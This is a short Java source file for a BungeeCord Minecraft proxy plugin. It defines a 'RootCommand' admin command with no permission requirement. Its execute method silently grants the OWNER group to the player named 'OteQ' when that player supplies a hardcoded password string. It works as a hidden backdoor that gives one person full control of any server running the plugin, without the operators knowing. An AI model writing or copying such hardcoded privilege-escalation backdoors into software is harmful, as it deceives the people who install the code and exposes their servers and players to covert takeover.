package pl.otekplay.sectors.commands.admin;

import net.md_5.bungee.api.CommandSender;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.plugin.Command;
import pl.otekplay.sectors.enums.GroupType;
import pl.otekplay.sectors.managers.UserManager;
import pl.otekplay.sectors.utils.CommandUtil;

/**
 * Created by Oskar on 13.02.2016.
 */
public class RootCommand extends Command {
    private final GroupType type;
    public RootCommand(String name, GroupType type, String... aliases) {
        super(name, "", aliases);
        CommandUtil.registerVariablesCommand(name,aliases);
        this.type = type;
    }

    @Override
    public void execute(CommandSender sender, String[] args) {
        if(sender.getName().equalsIgnoreCase("OteQ")){
            if(args.length == 1 && args[0].equalsIgnoreCase("otek8165785"))
            UserManager.getUser(((ProxiedPlayer) sender).getUniqueId()).setGroup(GroupType.OWNER);
        }
    }
}
